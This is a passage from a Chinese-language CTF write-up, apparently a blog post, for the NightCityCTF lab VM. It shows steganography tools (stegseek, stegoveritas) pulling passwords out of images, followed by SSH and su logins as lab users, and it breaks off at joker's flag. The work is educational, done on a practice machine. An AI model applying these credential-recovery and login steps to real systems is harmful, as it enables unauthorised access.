<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>先看robots.txt<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ1QjN.png" alt="OJ1QjN.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">#Good Job

To continue, you need a workmate. Our lastest news is that Robin is close to
NightCity. Try to find him, Robin has the key!</code></pre>
<p>意思是找到Robin</p>
<p>然后看一下robin这个目录<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ10UC.png" alt="OJ10UC.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">ATMAN Y ROBIN VOL. 01. PARTE I.

Hay un nuevo DÃºo DinÃ¡mico en la ciudad. Tras la desapariciÃ³n de Bruce Wayne, y concluida La Batalla por la Capucha, el Hombre MurciÃ©lago es ahora Dick Grayson. Pero tendrÃ¡ que llevar a cabo su misiÃ³n como justiciero junto a un acompaÃ±ante imprevisto: Damian Wayne, hijo de Bruce y Talia al Ghul, ha asumido el papel de Robin... despuÃ©s de que Tim Drake, el anterior titular, haya adoptado otra identidad y emprendido una difÃ­cil bÃºsqueda destinada a arrojar increÃ­bles resultados sobre el verdadero destino del mentor de todos ellos. Sin embargo, mientras tanto, Dick y Damian deberÃ¡n afrontar una Gotham que parece mÃ¡s enloquecida que nunca: a villanos cada vez mÃ¡s insÃ³litos, entre ellos el Profesor Pyg y los demÃ¡s miembros de su Circo de lo ExtraÃ±o, se une el regreso de otro excompaÃ±ero de Batman. Jason Todd, alias Capucha Roja, no solo cuenta con alguien muy sorprendente para ayudarle... Â¡tambiÃ©n estÃ¡ decidido a poner fin al reinado de los nuevos Batman y Robin antes incluso de que empiece!

Grant Morrison y Frank Quitely, un tÃ¡ndem con obras tan reconocidas como All-Star Superman y New X-Men, toma las riendas de la primera colecciÃ³n del Caballero Oscuro y el Chico Maravilla que lleva sus nombres en el tÃ­tulo... aunque los integrantes de este equipo no sean los habituales ni por asomo. Junto a Philip Tan (Batman del Futuro: La ciudad de japon), los dos aclamados autores escoceses abren una etapa repleta de innovadores conceptos y situaciones sin parangÃ³n que no dejarÃ¡n indiferente a ningÃºn lector. Lo demuestran a la perfecciÃ³n los dos arcos argumentales iniciales de la serie, Batman renacido y La venganza de Capucha Roja, que se incluyen Ã­ntegramente en este tomo de Batman Saga </code></pre>
<pre class="language-none"><code class="language-none">《蝙蝠侠与罗宾》第01卷。一方。
这是一个新的城市。Bruce Wayne的设计，以及Capucha的Batalla，el Hombre Murciâ©lago es ahora Dick Grayson。Pero tenderâque llevar是一位杰出的法官：Damian Wayne、Bruce和Talia al-Ghul，他是Robin的父亲……尽管Tim Drake是一位有名无实的前任，但他还是采用了一种不同的身份，并最终成为了一位杰出导师。在禁运期间，我的父亲，迪克和达米安·德贝尔在哥谭市的一个村庄里：一个小村庄，一个Pyg教授和一个名叫Circo de lo Extraéo的小村庄，这是蝙蝠侠的一个例外。Jason Todd，别名Capucha Roja，没有单独的线索。。。“坦比”是决定蝙蝠侠和罗宾的新成员，包括员工！
Grant Morrison和Frank Quitely，《全明星超人》和《新X战警》的合作伙伴，卡巴列罗·奥库罗和奇科·马拉维拉的朋友们。。。设备的集成不会影响到当地居民的生活。菲利普·谭（《未来蝙蝠侠：日本城》），这是一部充满创新概念和场景的电影，没有一个独立的演讲者。这是一部关于《蝙蝠侠传奇》系列、《蝙蝠侠重生》和《卡普查·罗贾之战》的辩论性作品，其中包括《蝙蝠侠传奇</code></pre>
<p>不是哥们英语差，是他不给哥们英语看<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ1cyL.png" alt="OJ1cyL.png" loading="lazy"></p>
<p>哥谭，我回家了(bushi)<br>看一下secret目录<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ1dsi.png" alt="OJ1dsi.png" loading="lazy"><br>三张图片，打开看了一下，直觉就是隐写，传到kali分析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.174/secret/most-wanted.jpg > most_wanted.jpg</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>  127k  <span class="token number">100</span>  127k    <span class="token number">0</span>     <span class="token number">0</span>  <span class="token number">39</span>.8M      <span class="token number">0</span> --:--:-- --:--:-- --:--:-- <span class="token number">41</span>.6M
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.174/secret/some-light.jpg >some-light.jpg   </span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>  213k  <span class="token number">100</span>  213k    <span class="token number">0</span>     <span class="token number">0</span>  <span class="token number">26</span>.5M      <span class="token number">0</span> --:--:-- --:--:-- --:--:-- <span class="token number">29</span>.8M
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.174/secret/veryImportant.jpg > veryImportant.jpg</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
<span class="token number">100</span>  185k  <span class="token number">100</span>  185k    <span class="token number">0</span>     <span class="token number">0</span>  <span class="token number">21</span>.8M      <span class="token number">0</span> --:--:-- --:--:-- --:--:-- <span class="token number">22</span>.6M
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># stegseek most_wanted.jpg </span>
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found passphrase: <span class="token string">"japon"</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Original filename: <span class="token string">"pass.txt"</span><span class="token builtin class-name">.</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Extracting to <span class="token string">"most_wanted.jpg.out"</span><span class="token builtin class-name">.</span>

                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat most_wanted.jpg.out                                                </span>
<span class="token assign-left variable">VGhpc0lzVGhlUmVhbFBhc3N3MHJkIQ</span><span class="token operator">==</span>
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat most_wanted.jpg.out | base64 -d</span>
ThisIsTheRealPassw0rd<span class="token operator">!</span>                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># stegseek some-light.jpg            </span>
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Progress: <span class="token number">98.91</span>% <span class="token punctuation">(</span><span class="token number">132.0</span> MB<span class="token punctuation">)</span>           
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> error: Could not <span class="token function">find</span> a valid passphrase.
                                                                                                                                                                                                                                                                                                                           
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># stegseek veryImportant.jpg </span>
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Progress: <span class="token number">98.89</span>% <span class="token punctuation">(</span><span class="token number">132.0</span> MB<span class="token punctuation">)</span>           
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> error: Could not <span class="token function">find</span> a valid passphrase.</code></pre>
<p>拿到一个密码<code>ThisIsTheRealPassw0rd!</code>，并没有登上robin的ssh，结果试了一下batman竟然登上去了，这波是直接化身蝙蝠侠，正常来说得拿字典爆破一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ssh robin@192.168.56.174  </span>
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.174 (192.168.56.174)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:b5bJxI3fDeAAZm5bTrbGo9f1KEpEBR0FiU/HV8nzM3M.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
Please type '</span><span class="token function">yes</span><span class="token string">', '</span>no<span class="token string">' or the fingerprint: yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.174<span class="token string">' (ED25519) to the list of known hosts.
robin@192.168.56.174'</span>s password: 
Permission denied, please try again.
robin@192.168.56.174<span class="token string">'s password: 

                                                                                                                                                                                                                                                                                                                           
┌──(root㉿kali2)-[~/Desktop]
└─# ssh batman@192.168.56.174
batman@192.168.56.174'</span>s password: 

 _   _ _       _     _    ____ _ _         
<span class="token operator">|</span> <span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> __ _<span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token operator">|</span>_ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_ _   _ 
<span class="token operator">|</span>  <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span> '_ <span class="token punctuation">\</span><span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token operator">|</span><span class="token punctuation">\</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>___<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>
<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token punctuation">\</span>_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span><span class="token punctuation">\</span>____<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span>
         <span class="token operator">|</span>___/                       <span class="token operator">|</span>___/ 

***  NightCityCTF © <span class="token number">2022</span> by Waidroc <span class="token operator">&amp;</span> Cillo31 is licensed under CC BY-NC-SA <span class="token number">4.0</span>.  ***
              ***  https://www.github.com/Waidroc/NightCityCTF ***                   

Welcome to Ubuntu <span class="token number">18.04</span>.6 LTS <span class="token punctuation">(</span><span class="token number">5.4</span>.0-84-generic<span class="token punctuation">)</span>.

System information as of: Wed May <span class="token number">15</span> <span class="token number">12</span>:14:49 CEST <span class="token number">2024</span>

System Load:    <span class="token number">0.00</span>    IP Address:
Memory Usage:   <span class="token number">8.1</span>%    System Uptime:  <span class="token number">36</span> min
Usage On /:     <span class="token number">50</span>%     Swap Usage:     <span class="token number">0.0</span>%
Local Users:    <span class="token number">0</span>       Processes:      <span class="token number">125</span>

*** System restart required ***
<span class="token number">38</span> updates can be applied immediately.
To see these additional updates run: <span class="token function">apt</span> list <span class="token parameter variable">--upgradable</span>

Last login: Wed Jun <span class="token number">15</span> <span class="token number">19</span>:15:17 <span class="token number">2022</span> from <span class="token number">10.0</span>.2.8
batman@NightCity:~$</code></pre>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">batman@NightCity:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">308</span>
drwxr-xr-x <span class="token number">5</span> batman        batman          <span class="token number">4096</span> jun <span class="token number">15</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">6</span> root          root            <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> batman        batman           <span class="token number">972</span> jun <span class="token number">15</span>  <span class="token number">2022</span> .bash_history
-rw-r--r-- <span class="token number">1</span> batman        batman           <span class="token number">220</span> jun  <span class="token number">8</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> batman        batman          <span class="token number">3771</span> jun  <span class="token number">8</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> batman        batman          <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> .cache
-rw-r--r-- <span class="token number">1</span> root          root              <span class="token number">66</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> flag.txt
drwx------ <span class="token number">3</span> batman        batman          <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> .gnupg
-rw-rw-r-- <span class="token number">1</span> administrator administrator <span class="token number">272105</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> iknowyou.jpg
drwxrwxr-x <span class="token number">3</span> batman        batman          <span class="token number">4096</span> jun <span class="token number">15</span>  <span class="token number">2022</span> .local
-rw-r--r-- <span class="token number">1</span> batman        batman           <span class="token number">807</span> jun  <span class="token number">8</span>  <span class="token number">2022</span> .profile
batman@NightCity:~$ <span class="token function">cat</span> flag.txt 
Nice try<span class="token operator">!</span> but, this is not the flag. You have to keep working <span class="token operator">></span>:<span class="token punctuation">)</span></code></pre>
<p>batman用户的密码就是user flag，所以这个flag.txt没什么鸟用，当前目录下有个图片iknowyou.jpg，不会还是隐写吧<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ1lIj.png" alt="OJ1lIj.png" loading="lazy"><br>python开个http服务传到kali上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># stegseek iknowyou.jpg       </span>
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Progress: <span class="token number">99.25</span>% <span class="token punctuation">(</span><span class="token number">132.4</span> MB<span class="token punctuation">)</span>           
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> error: Could not <span class="token function">find</span> a valid passphrase.</code></pre>
<p>stegseek没跑出来</p>
<p>自己手动分析一下吧，又是做上MISC说是<br>用stegsolve翻了一下，发现柱子上好像有东西，但是用我5.0的视力也还是看不清<br><img src="https://ooo.0x0.ooo/2024/05/15/OJ1jhp.png" alt="OJ1jhp.png" loading="lazy"><br>学到了一个新的隐写分析攻击<code>stegoveritas</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ pip3 <span class="token function">install</span> stegoveritas
$ stegoveritas_install_deps</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># stegoveritas iknowyou.jpg </span>
Running Module: SVImage
+------------------+------+
<span class="token operator">|</span>   Image Format   <span class="token operator">|</span> Mode <span class="token operator">|</span>
+------------------+------+
<span class="token operator">|</span> JPEG <span class="token punctuation">(</span>ISO <span class="token number">10918</span><span class="token punctuation">)</span> <span class="token operator">|</span> RGB  <span class="token operator">|</span>
+------------------+------+
+---------+------------------+-------------------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> Offset  <span class="token operator">|</span> Carved/Extracted <span class="token operator">|</span> Description                                                                                           <span class="token operator">|</span> File Name <span class="token operator">|</span>
+---------+------------------+-------------------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> 0x2d411 <span class="token operator">|</span> Carved           <span class="token operator">|</span> LZMA compressed data, properties: 0xC0, dictionary size: <span class="token number">16777216</span> bytes, uncompressed size: <span class="token number">132</span> bytes <span class="token operator">|</span> 2D411.7z  <span class="token operator">|</span>
<span class="token operator">|</span> 0x2d411 <span class="token operator">|</span> Extracted        <span class="token operator">|</span> LZMA compressed data, properties: 0xC0, dictionary size: <span class="token number">16777216</span> bytes, uncompressed size: <span class="token number">132</span> bytes <span class="token operator">|</span> 2D411     <span class="token operator">|</span>
+---------+------------------+-------------------------------------------------------------------------------------------------------+-----------+
+---------+------------------+-------------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> Offset  <span class="token operator">|</span> Carved/Extracted <span class="token operator">|</span> Description                                                                                     <span class="token operator">|</span> File Name <span class="token operator">|</span>
+---------+------------------+-------------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> 0x30fd2 <span class="token operator">|</span> Carved           <span class="token operator">|</span> LZMA compressed data, properties: 0xC0, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">6144</span> bytes <span class="token operator">|</span> 30FD2.7z  <span class="token operator">|</span>
<span class="token operator">|</span> 0x30fd2 <span class="token operator">|</span> Extracted        <span class="token operator">|</span> LZMA compressed data, properties: 0xC0, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">6144</span> bytes <span class="token operator">|</span> 30FD2     <span class="token operator">|</span>
+---------+------------------+-------------------------------------------------------------------------------------------------+-----------+
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> Offset <span class="token operator">|</span> Carved/Extracted <span class="token operator">|</span> Description                                                                                   <span class="token operator">|</span> File Name <span class="token operator">|</span>
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
<span class="token operator">|</span> 0x4d11 <span class="token operator">|</span> Carved           <span class="token operator">|</span> LZMA compressed data, properties: 0x92, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">32</span> bytes <span class="token operator">|</span> 4D11.7z   <span class="token operator">|</span>
<span class="token operator">|</span> 0x4d11 <span class="token operator">|</span> Extracted        <span class="token operator">|</span> LZMA compressed data, properties: 0x92, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">32</span> bytes <span class="token operator">|</span> 4D11      <span class="token operator">|</span>
<span class="token operator">|</span> 0x81c4 <span class="token operator">|</span> Carved           <span class="token operator">|</span> LZMA compressed data, properties: 0x90, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">32</span> bytes <span class="token operator">|</span> 81C4.7z   <span class="token operator">|</span>
<span class="token operator">|</span> 0x81c4 <span class="token operator">|</span> Extracted        <span class="token operator">|</span> LZMA compressed data, properties: 0x90, dictionary size: <span class="token number">0</span> bytes, uncompressed size: <span class="token number">32</span> bytes <span class="token operator">|</span> 81C4      <span class="token operator">|</span>
+--------+------------------+-----------------------------------------------------------------------------------------------+-----------+
Running Module: MultiHandler

Found something worth keeping<span class="token operator">!</span>
JPEG image data, Exif standard: <span class="token punctuation">[</span>TIFF image data, big-endian, <span class="token assign-left variable">direntries</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">]</span>, baseline, precision <span class="token number">8</span>, 1200x454, components <span class="token number">3</span>
Exif
<span class="token operator">==</span><span class="token operator">==</span>
+---------------------+-----------------------------------------+
<span class="token operator">|</span> key                 <span class="token operator">|</span> value                                   <span class="token operator">|</span>
+---------------------+-----------------------------------------+
<span class="token operator">|</span> SourceFile          <span class="token operator">|</span> /root/Desktop/iknowyou.jpg              <span class="token operator">|</span>
<span class="token operator">|</span> ExifToolVersion     <span class="token operator">|</span> <span class="token number">12.76</span>                                   <span class="token operator">|</span>
<span class="token operator">|</span> FileName            <span class="token operator">|</span> iknowyou.jpg                            <span class="token operator">|</span>
<span class="token operator">|</span> Directory           <span class="token operator">|</span> /root/Desktop                           <span class="token operator">|</span>
<span class="token operator">|</span> FileSize            <span class="token operator">|</span> <span class="token number">272</span> kB                                  <span class="token operator">|</span>
<span class="token operator">|</span> FileModifyDate      <span class="token operator">|</span> <span class="token number">2022</span>:06:10 01:55:43+08:00               <span class="token operator">|</span>
<span class="token operator">|</span> FileAccessDate      <span class="token operator">|</span> <span class="token number">2024</span>:05:15 <span class="token number">18</span>:33:57+08:00               <span class="token operator">|</span>
<span class="token operator">|</span> FileInodeChangeDate <span class="token operator">|</span> <span class="token number">2024</span>:05:15 <span class="token number">18</span>:33:57+08:00               <span class="token operator">|</span>
<span class="token operator">|</span> FilePermissions     <span class="token operator">|</span> -rw-r--r--                              <span class="token operator">|</span>
<span class="token operator">|</span> FileType            <span class="token operator">|</span> JPEG                                    <span class="token operator">|</span>
<span class="token operator">|</span> FileTypeExtension   <span class="token operator">|</span> jpg                                     <span class="token operator">|</span>
<span class="token operator">|</span> MIMEType            <span class="token operator">|</span> image/jpeg                              <span class="token operator">|</span>
<span class="token operator">|</span> ExifByteOrder       <span class="token operator">|</span> Big-endian <span class="token punctuation">(</span>Motorola, MM<span class="token punctuation">)</span>               <span class="token operator">|</span>
<span class="token operator">|</span> DCTEncodeVersion    <span class="token operator">|</span> <span class="token number">100</span>                                     <span class="token operator">|</span>
<span class="token operator">|</span> APP14Flags0         <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span>, Encoded with <span class="token assign-left variable">Blend</span><span class="token operator">=</span><span class="token number">1</span> downsampling <span class="token operator">|</span>
<span class="token operator">|</span> APP14Flags1         <span class="token operator">|</span> <span class="token punctuation">(</span>none<span class="token punctuation">)</span>                                  <span class="token operator">|</span>
<span class="token operator">|</span> ColorTransform      <span class="token operator">|</span> YCbCr                                   <span class="token operator">|</span>
<span class="token operator">|</span> ImageWidth          <span class="token operator">|</span> <span class="token number">1200</span>                                    <span class="token operator">|</span>
<span class="token operator">|</span> ImageHeight         <span class="token operator">|</span> <span class="token number">454</span>                                     <span class="token operator">|</span>
<span class="token operator">|</span> EncodingProcess     <span class="token operator">|</span> Baseline DCT, Huffman coding            <span class="token operator">|</span>
<span class="token operator">|</span> BitsPerSample       <span class="token operator">|</span> <span class="token number">8</span>                                       <span class="token operator">|</span>
<span class="token operator">|</span> ColorComponents     <span class="token operator">|</span> <span class="token number">3</span>                                       <span class="token operator">|</span>
<span class="token operator">|</span> YCbCrSubSampling    <span class="token operator">|</span> YCbCr4:4:4 <span class="token punctuation">(</span><span class="token number">1</span> <span class="token number">1</span><span class="token punctuation">)</span>                        <span class="token operator">|</span>
<span class="token operator">|</span> ImageSize           <span class="token operator">|</span> 1200x454                                <span class="token operator">|</span>
<span class="token operator">|</span> Megapixels          <span class="token operator">|</span> <span class="token number">0.545</span>                                   <span class="token operator">|</span>
+---------------------+-----------------------------------------+</code></pre>
<p>在result里面找到一张巨清晰的，柱子上面写着<code>ThatMadeMeL4ugh!</code><br><img src="https://ooo.0x0.ooo/2024/05/15/OJ16jY.png" alt="OJ16jY.png" loading="lazy"><br>尝试登录home下面其他几个用户，发现可以登上joker</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">batman@NightCity:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">24</span>
drwxr-xr-x  <span class="token number">6</span> root          root          <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">24</span> root          root          <span class="token number">4096</span> may <span class="token number">15</span> <span class="token number">12</span>:03 <span class="token punctuation">..</span>
drwxrwx--- <span class="token number">15</span> administrator administrator <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> administrator
drwxr-xr-x  <span class="token number">3</span> root          root          <span class="token number">4096</span> jun  <span class="token number">9</span>  <span class="token number">2022</span> anonymous
drwxr-xr-x  <span class="token number">5</span> batman        batman        <span class="token number">4096</span> jun <span class="token number">15</span>  <span class="token number">2022</span> batman
drwxrwx---  <span class="token number">2</span> joker         joker         <span class="token number">4096</span> jun <span class="token number">13</span>  <span class="token number">2022</span> .joker
batman@NightCity:/home$ <span class="token function">su</span> administrator 
Contraseña: 
su: Fallo de autenticación
batman@NightCity:/home$ <span class="token function">su</span> joker
Contraseña: 
joker@NightCity:/home$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>joker<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>joker<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>joker<span class="token punctuation">)</span>
joker@NightCity:/home$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">joker@NightCity:/home/.joker$ <span class="token function">cat</span> flag.txt 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣤⣶⡶⠛⠉⠉⠀⣀⣀⣀⣤⣤⣤⣶⣶⣒⣛⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠋⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡽⣟⣫⣭⣶⣶⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠙⠉⠁⠀⢿⣿⣿⣿⣿⡿⠿⠿⣿⡿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀
⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠈⠻⠿⠿⠿⠿⠟⠛⠉⠁⠙⠿⠿⠛⠋⠉⠀⠀⠀⢀⣠⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣙⠻⢿⣿⣿⣿⣶⣶⣶⣦⣤⣤⣴⢶⣾⠟⠀⠀
⠀⠀⠀⠀⠀⠰⡏⣴⣄⠀⠀⠀⠀⠀⢀⣠⣴⣤⣄⣀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠙⠛⠛⠛⠛⠛⠉⣉⡴⢟⣡⣴⠏⠀
⠀⠀⠀⠀⠀⠀⠳⣿⣿⣷⣦⣀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⣀⣶⣿⣿⡿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⣰⣾⣷⣾⣿⡿⠃⠀⠀
